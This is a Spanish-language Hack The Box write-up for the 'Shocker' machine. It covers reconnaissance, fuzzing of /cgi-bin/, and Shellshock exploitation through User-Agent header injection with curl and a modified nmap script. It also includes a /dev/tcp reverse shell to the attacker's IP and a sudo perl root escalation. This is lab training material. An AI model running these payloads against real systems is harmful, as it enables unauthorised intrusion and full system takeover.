---
layout: single
title: Shocker - Hack The Box
excerpt: "Descubrimos /cgi-bin/ mediante fuzzing y explotamos Shellshock (vulnerabilidad en Bash) enviando un encabezado malicioso para conseguir RCE y una reverse shell. Luego escalamos privilegios abusando de un permiso de sudo que nos permite ejecutar un binario con permisos privilegios cual nos hara root."
date: 2025-10-11
classes: wide
header:
  teaser: /assets/images/htb-writeup-shocker/logo_shocker.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hackthebox
  - Pentesting
  - eWPT
  - eJPTv2
tags:
  - writeup
  - eJPTv2
  - eWPT
  - HackingWeb
  - Fuzzing
  - cgi-bin
  - RemoteAccessRCE
  - shellsockUSER-AGENT
  - CVE-2014-6271
  - ReverseShell
  - EscaladaPrivilegios
  - Sudo
---

![](/assets/images/htb-writeup-shocker/logo_shocker.png)

"Mediante Fuzzing a directorios web, hemos descubierto un directorio <span style="color:lightblue">/cgi-bin/</span> cual al almacenar scripts podremos abusar de uno cual nos va a permitir usar mediante un encabezado de solicitud usar una *Shellshosck* y tener una **RCE** y darnos una revershell.
Para escalar privilegios explotaremos un permisos de sudo sencillo y nos haremos root."

## WRITE UP
IP VÍCTIMA: 10.10.10.56 (víctima) TTL= 63 LINUX


#### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Shocker</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**

>**which** mkt.py | **xargs** **batcat** -l python

*Ver en que ubicación está una herramienta y ver su código*
*Adelante explicamos a tener batcat, que es un cat pero con esteroides*

Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

![](/assets/images/htb-writeup-shocker/whichsystem_shocker.png)


-Usar el comando *ping* <span style="color:red">10.10.10.56</span> <span style="color:yellow">-c</span> 1  <span style="color:yellow">-R</span>
*-R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición*

![](/assets/images/htb-writeup-shocker/conectividad_shocker.png)


Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.


**nmap** <span style="color:yellow">-p- --open -Pn -vvv -n -sS --min-rate 5000</span> <span style="color:red">10.10.10.56</span> <span style="color:yellow">-oG</span> <span style="color:pink">allPorts</span>
*Veremos porque el formato grepeable, es importante.*

![](/assets/images/htb-writeup-shocker/nmap1_shocker.png)


Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

![](/assets/images/htb-writeup-shocker/extractports_shocker.png)


**nmap** <span style="color:yellow">-sVC</span> <span style="color:yellow">-p</span><span style="color:purple">80,2222</span> <span style="color:red">10.10.10.56</span> <span style="color:yellow">-oN</span> <span style="color:pink">targeted</span> 
*Este formato lo emplearemos con batcat lenguaje java para verlo mejor*

![](/assets/images/htb-writeup-shocker/nmap2_shocker.png)


Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

**batcat** <span style="color:pink">target</span> <span style="color:yellow">-l</span> <span style="color:orange">java</span>
*nos mostrara la salida en un formato más bonito, con java*

![](/assets/images/htb-writeup-shocker/batcat_shocker.png)


Puerto <span style="color:purple">80</span> que corre el servicio <span style="color:orange">HTTP</span>

Puerto <span style="color:purple">2222</span> que corre el servicio <span style="color:orange">SSH</span>


#### ANÁLISIS SSH: RECONOCIMIENTO

Como tenemos la versión del openssh vamos a ver si podemos encontrar alguna vulnerabilidad con *searchsploit*. Pero no tenemos credenciales

![](/assets/images/htb-writeup-shocker/searchespssh_shocker.png)

Nada interesante.

#### ANÁLISIS WEB: RECONOCIMIENTO

Con *whatweb* haremos un reconocimiento a nivel web para sacar algo mas de información, **tecnologías...**, igual que <span style="color:lightyellow">Wappalyzer</span> pero por consola.

![](/assets/images/htb-writeup-shocker/whatweb_shocker.png)


Si entramos a la página, nos saldrá esto: 
**Que no le molestemos dice el bicho**

![](/assets/images/htb-writeup-shocker/dontbugme_shocker.png)


Con la extensión <span style="color:lightyellow">Wappalyzer</span> podremos ver también las tecnologías de forma clara.

![](/assets/images/htb-writeup-shocker/wappalyzer_shocker.png)


#### POSIBLES METADATOS

A simple vista como tenemos la imagen quizás estemos enfrente de **esteganografía**; Esconder
datos ocultos entre los bits de la imagen.

Usaremos *exiftool* para sacar los metadatos.

![](/assets/images/htb-writeup-shocker/metadatos_shocker.png)

No hay nada.


#### FUZZING DE DIRECTORIOS A NIVEL WEB

Con *ffuf* lo que haremos es hacer **Fuzzing** a directorios web para descubrir nuevos.
**CUIDADO!!! HAY QUE SABER COMO COLOCAR LA RUTA.**


**ffuf** <span style="color:green">-c  -t</span>  200  <span style="color:green">-w</span>  <span style="color:lightblue">/usr/share/wordlists/SecLists/Discovery/Web-Content/</span>directory-list-2.3-medium.txt <span style="color:green">-u</span>  http://10.10.10.56/FUZZ

![](/assets/images/htb-writeup-shocker/fuzzpag_shocker.png)


>Siempre hay que asegurar y terminarlo con / para evitar mal entendimientos y ir a lo seguro.

**ffuf** <span style="color:green">-c  -t</span>  200  <span style="color:green">-w</span>  <span style="color:lightblue">/usr/share/wordlists/SecLists/Discovery/Web-Content/</span>directory-list-2.3-medium.txt <span style="color:green">-u</span>  http://10.10.10.56/FUZZ/

Encontrará dos; nos quedaremos con <span style="color:lightblue">/cgi-bin/</span>.

![](/assets/images/htb-writeup-shocker/fuzzpag2_shocker.png)


#### CGI-BIN

Googleamos para lo que sirve este directorio y nos dice que se encarga de **almacenar scripts y donde se ejecutan**. De extensiones: <span style="color:grey">.pl .cgi .sh</span>

![](/assets/images/htb-writeup-shocker/cgibin_shocker.png)



#### FUZZING EXTENSIONES: CGI-BIN

Para saber que scripts están almacenados en dicha ruta, haremos fuzzing a los archivos filtrando por las extensiones anteriores.

**ffuf** <span style="color:green">-c  -t</span>  200  <span style="color:green">-w</span>  <span style="color:lightblue">/usr/share/wordlists/SecLists/Discovery/Web-Content/</span>directory-list-2.3-medium.txt <span style="color:green">-e</span> .sh,.pl,.cgi <span style="color:green">-u</span>  http://10.10.10.56/cgi-bin/FUZZ <span style="color:green">-fc</span> 404 <span style="color:green">-mc</span> 200,302,403,405

![](/assets/images/htb-writeup-shocker/fuzzcigbin_shocker.png)


Nos encontrará un <span style="color:lime">user.sh</span>

![](/assets/images/htb-writeup-shocker/archcgi_shocker.png)


Vemos que no podemos acceder al directorio <span style="color:lightblue">/cgi-bin/</span> por falta de permisos, pero eso no quiere decir que no podamos acceder a los archivos como <span style="color:lime">user.sh</span>.

![](/assets/images/htb-writeup-shocker/forbcgi_shocker.png)


Probamos a entrar y nos deja. No tiene nada interesante

![](/assets/images/htb-writeup-shocker/200arch_shocker.png)


Si usamos *curl* también va a dejar leerlo. (Es dinámico)

![](/assets/images/htb-writeup-shocker/curldinarch_shocker.png)


#### SHELLSHOCK: IDENTIFICACIÓN

Para está maquina, ganaremos una ejecución por comandos mediante el ataque *Shellshosck*, ya que cuando tratamos con temas como **cgi-bin** y extensiones parecidas. Hay que pensar siempre en este ataque.

En Google nos cuenta que nos permite una **RCE** mediante una inyección maliciosa de los **Headers request**.


![](/assets/images/htb-writeup-shocker/identshock_shocker.png)


Para saber si es vulnerable a una **shellshock** usaremos un script de *nmap*:

**locate** shellshock | **grep** ".nse"

<span style="color:red">http-shellshock.nse</span>

![](/assets/images/htb-writeup-shocker/scriptshshock_shocker.png)


Sintaxis:
**nmap** <span style="color:green">--script</span>  <span style="color:red">http-shellshock</span> <span style="color:green">--script-args uri=</span>/cgi-bin/user.sh  <span style="color:green">-p80</span>  10.10.10.56

Nos dice que es VULNERABLE y se conoce como **CVE-2014-6271**.

![](/assets/images/htb-writeup-shocker/usarscript_shocker.png)


#### SHELLSHOCK: COMO FUNCIONA

Para saber como **nmap** prueba el script, lo que haremos es capturar el tráfico de nmap.

Usamos *tshark* para ponernos en escucha y capturar el tráfico en .cap por la interfaz de la **VPN**.

**tshark** <span style="color:green">-w</span> <span style="color:grey">trafico.cap</span> <span style="color:green">-i</span> **tun0**

![](/assets/images/htb-writeup-shocker/nmaptshark_shocker.png)


Ejecutamos el script de nmap.

![](/assets/images/htb-writeup-shocker/usarsc_shocker.png)


Nos dice que ha capturado 51 paquetes.

![](/assets/images/htb-writeup-shocker/totalcap_shocker.png)


Miramos el tráfico de la captura:
**tshark** <span style="color:green">-r</span> <span style="color:grey">trafico.cap</span> <span style="color:lightblue">2>/dev/null</span>

![](/assets/images/htb-writeup-shocker/leerpaq_shocker.png)


Filtramos por los campos HTTP, ya que es por ahí por donde abusamos de este ataque:
**tshark** <span style="color:green">-r</span> <span style="color:grey">trafico.cap</span> <span style="color:green">-Y</span> <span style="color:orange">"http"</span> <span style="color:lightblue">2>/dev/null</span>

![](/assets/images/htb-writeup-shocker/filtrohttp_shocker.png)


Ahora cogeremos la data en hexadecimal que contiene los datos del paquete http, en formato json.
**tshark** <span style="color:green">-r</span> <span style="color:grey">trafico.cap</span> <span style="color:green">-Y</span> <span style="color:orange">"http"</span>  <span style="color:green">-Tjson</span>  <span style="color:lightblue">2>/dev/null</span>

![](/assets/images/htb-writeup-shocker/jsonenhex_shocker.png)

(NO ese en especifico sino fiijarse solo en el nombre del campo)
Nos fijaremos en el campo **tpc.payload**

![](/assets/images/htb-writeup-shocker/tcpload_shocker.png)

Como vemos está en hexdeciamal:
**tshark** <span style="color:green">-r</span> <span style="color:grey">trafico.cap</span> <span style="color:green">-Y</span> <span style="color:orange">"http"</span> <span style="color:green">-Tfields  -e</span>  "<span style="color:orange">tcp.payload</span>" <span style="color:lightblue">2>/dev/null</span>

![](/assets/images/htb-writeup-shocker/tcp2_shocker.png)

Para pasarlo a texto claro usamos *xxd*:
**tshark** <span style="color:green">-r</span> <span style="color:grey">trafico.cap</span> <span style="color:green">-Y</span> <span style="color:orange">"http"</span> <span style="color:green">-Tfields  -e</span>  "<span style="color:orange">tcp.payload</span>" <span style="color:lightblue">2>/dev/null</span> | <span style="color:cyan">xxd</span> <span style="color:green">-ps -r
</span>


Como vemos usa 3 request headers para inyectar código; **Referer, User-Agent y Cookie**.

**Paylodad**:  () {  :;}; echo;

![](/assets/images/htb-writeup-shocker/encmal_shocker.png)


#### SHELLSHOCK: COMO ATACAR con curl
>Artículo acerca del ataque:
>[Documentación shellshock](https://blog.cloudflare.com/inside-shellshock/)


Nos dice que podemos inyectar comandos mediante una cadena (vista anteriormente) a una ruta específica. Usaremos el header **User-Agent**

![](/assets/images/htb-writeup-shocker/docsho_shocker.png)


Identificamos la ruta de un comando por ejemplo "**id**" -> <span style="color:lightblue">/usr/bin/</span>**id**

Con *curl* pondremos lo siguiente:

**curl**  <span style="color:green">-s -X</span> GET http://10.10.10.56/cgi-bin/user.sh  <span style="color:green">-H</span>  <span style="color:orange">"User-Agent:</span>  () { :;};**echo**;  <span style="color:lightblue">/usr/bin/</span>**id**"

Y nos da la salida, respondiendo la salida del comando.

![](/assets/images/htb-writeup-shocker/rcecurl_shocker.png)


#### SHELLSHOCK: COMO ATACAR con nmap

**nmap** <span style="color:green">--script</span>  <span style="color:red">http-shellshock</span> <span style="color:green">--script-args uri=</span>/cgi-bin/user.sh,cmd=whoami  <span style="color:green">-p80</span>  10.10.10.56


Nos saldrá un error, debido a que el script tiene un error.

![](/assets/images/htb-writeup-shocker/erronmaprce_shocker.png)


Entramos para editar el script con dicha ruta:

![](/assets/images/htb-writeup-shocker/scriptshshock_shocker.png)


Modificamos el campo de la cadena cmd -> añadiendo ;echo;

![](/assets/images/htb-writeup-shocker/fixerrnmaprce_shocker.png)


Probamos a ejecutarlo y ya podremos ejecutar comandos con **nmap**. (Ponemos la ruta del comando)

**nmap** <span style="color:green">--script</span>  <span style="color:red">http-shellshock</span> <span style="color:green">--script-args uri=</span>/cgi-bin/user.sh,cmd=/usr/bin/whoami  <span style="color:green">-p80</span>  10.10.10.56

![](/assets/images/htb-writeup-shocker/rcesuccnmap_shocker.png)


#### REVERSHELL

Nos ponemos en escucha por el <span style="color:purple">puerto 444</span> con *netcat*, para recibir la Shell víctima a nuestro host.

![](/assets/images/htb-writeup-shocker/confnc_shocker.png)


Nos daremos una *reverse shell* usando la *Shellshosck* mediante <span style="color:lightblue">/bin/</span>**bash**.

**curl**  <span style="color:green">-s -X</span> GET http://10.10.10.56/cgi-bin/user.sh  <span style="color:green">-H</span>  <span style="color:orange">"User-Agent:</span>  () { :;};**echo**;  <span style="color:lightblue">/bin/</span>**bash**  -i >& /dev/tcp/10.10.16.10/444 0>&1<span style="color:orange">"</span>

![](/assets/images/htb-writeup-shocker/curlrvshell_shocker.png)


Recibimos la shell a nuestro netcat.

![](/assets/images/htb-writeup-shocker/hostrecibi_shocker.png)


Lo comprobamos con "**id**", por ejemplo.

![](/assets/images/htb-writeup-shocker/checkid_shocker.png)


#### SHELL INTERACTIVA

1) **script** /dev/null -c bash

![](/assets/images/htb-writeup-shocker/tty1_shocker.png)


2) **CTRL** <span style="color:orange">+</span> **Z** para suspender netcat a segundo plano. (lo hago con otro puerto)

![](/assets/images/htb-writeup-shocker/tty2_shocker.png)


3) **stty** <span style="color:yellow">raw</span> <span style="color:green">-echo</span><span style="color:orange">;</span> <span style="color:yellow">fg</span>

![](/assets/images/htb-writeup-shocker/tty3_shocker.png)


4) **reset  xterm**

![](/assets/images/htb-writeup-shocker/tty4_shocker.png)


5) **export TERM**<span style="color:yellow">=xterm</span>

![](/assets/images/htb-writeup-shocker/tty5_shocker.png)


#### BANDERA USER

Nos vamos al directorio de <span style="color:blue">shelly</span> en su home <span style="color:lightblue">shelly/</span> y cogemos la bandera.


![](/assets/images/htb-writeup-shocker/flaguser_shocker.png)


#### ESCALADA DE PRIVILEGIOS

Listamos nuestro privilegio de SUDO.

**sudo -l**

Tendremos privilegios con el usuario root sobre el binario **perl** , entonces lo aprovecharemos para darnos una shell privilegiada de root.

![](/assets/images/htb-writeup-shocker/listsudopriv_shocker.png)


Podríamos usar el siguiente repositorio online para mirar que podemos hacer con dicho privilegios: [GTFobins](https://gtfobins.github.io)

<iframe src="https://gtfobins.github.io/gtfobins/perl/#sudo" allow="fullscreen" allowfullscreen="" style="height: 100%; width: 100%; aspect-ratio: 4 / 3;"></iframe>

Como vemos tiene la misma sintaxis que el SUDO **ruby**, de la maquina *vacaciones*.

Para escalar privilegios nos daremos la shell, con la siguiente sintaxis:
**sudo** <span style="color:cyan">perl</span> <span style="color:green">-e</span> '**exec** "<span style="color:lightblue">/bin/</span>**sh**"<span style="color:orange">;</span>'

![](/assets/images/htb-writeup-shocker/usosudoperl_shocker.png)

>Con "**bash**" nos daremos la shell interactiva.
 

#### BANDERA ROOT

Nos vamos al directorio de <span style="color:blue">root</span> en  <span style="color:lightblue">root/</span> y cogemos la bandera.

![](/assets/images/htb-writeup-shocker/flagroot_shocker.png)
